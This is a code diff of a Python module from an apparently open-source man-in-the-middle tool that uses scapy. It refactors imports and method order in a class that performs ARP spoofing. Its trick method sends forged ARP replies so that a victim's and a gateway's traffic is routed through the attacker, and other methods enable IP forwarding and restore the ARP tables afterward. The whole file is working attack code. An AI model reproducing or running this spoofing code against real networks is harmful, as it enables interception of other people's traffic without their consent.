@@ -28,8 +28,12 @@
  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 """
+import os
+import sys
+import time
 
-from scapy.all import *
+from scapy import sendrecv
+from scapy.layers import l2
 
 from mitm_core import mitm_args
 
@@ -38,12 +42,12 @@ from mitm_core import mitm_args
 class Mitm:
 
     def __init__(self):
-        self.enable_forwarding()
         self.interface = mitm_args.get_interface()
         self.victim_ip = mitm_args.get_victimIP()
         self.gate_ip = mitm_args.get_gateIP()
         self.victim_mac = self.get_mac(self.victim_ip)
         self.gate_mac = self.get_mac(self.gate_ip)
+        self.enable_forwarding()
 
     def enable_forwarding(self):
         print("\n[*] Enabling IP forwarding....\n")
@@ -54,29 +58,31 @@ class Mitm:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
     def mitm_shutdown(self):
-        print("\n[*] User Requested Shutdown")
-        print("[*] Exiting...")
-        self.disable_forwarding()
+        print("\n[*] Exiting...")
+        self.disconnect()
         sys.exit(1)
 
     def get_mac(self, ip):
-        return scapy.layers.l2.getmacbyip(ip)
+        return l2.getmacbyip(ip)
 
     def re_arp(self):
         try:
             print("\n[*] Restoring Targets...")
             victim_mac = self.get_mac(self.victim_ip)
             gate_mac = self.get_mac(self.gate_ip)
-            sendp(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip,
-                      hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
-            sendp(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip,
-                      hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
+            sendrecv.sendp(l2.ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip,
+                                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
+            sendrecv.sendp(l2.ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip,
+                                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
         except KeyboardInterrupt:
             self.mitm_shutdown()
 
     def trick(self, gm, vm):
-        sendp(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip, hwdst=vm))
-        sendp(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip, hwdst=gm))
+        sendrecv.send(l2.ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip, hwdst=vm))
+        sendrecv.send(l2.ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip, hwdst=gm))
+
+    def disconnect(self):
+        self.re_arp()
 
     def connect(self, connection_attempts=1, pause_time=0.5):
         """
@@ -105,6 +111,3 @@ class Mitm:
                 self.re_arp()
                 break
         self.mitm_shutdown()
-
-    def disconnect(self):
-        self.re_arp()
